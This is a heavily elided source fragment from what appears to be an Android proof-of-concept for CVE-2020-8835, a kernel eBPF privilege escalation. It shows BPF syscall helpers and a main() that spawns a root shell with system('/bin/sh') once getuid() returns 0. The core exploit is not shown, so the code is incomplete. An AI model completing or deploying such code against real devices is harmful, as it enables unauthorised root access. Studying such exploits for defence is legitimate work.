...
#define __NR_BPF 386
#endif
#define ptr_to_u32(ptr) ((__u32)(unsigned long)(ptr))
...
int bpf_obj_get_info_by_fd(int fd, const unsigned int info_len, void *info)
{
    ...
    attr.info.info = ptr_to_u32(info);
                  ...
                  const char *license)
{
    union bpf_attr attr = {
            .prog_type = type,
            .insns = ptr_to_u32(insns),
            .insn_cnt = insn_cnt,
            .license = ptr_to_u32(license),
            .log_buf = ptr_to_u32(bpf_log_buf),
...
int main()
{
    ...
    if(getuid() == 0)
    {
        puts("getting shell!");
        system("/bin/sh");
        system("sed '/cn.google/d' ./system/etc/sysconfig/cn_google_features.xml");
    }

}

extern "C" JNIEXPORT jstring JNICALL
Java_com_kashamalaga_CVE20208835_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {
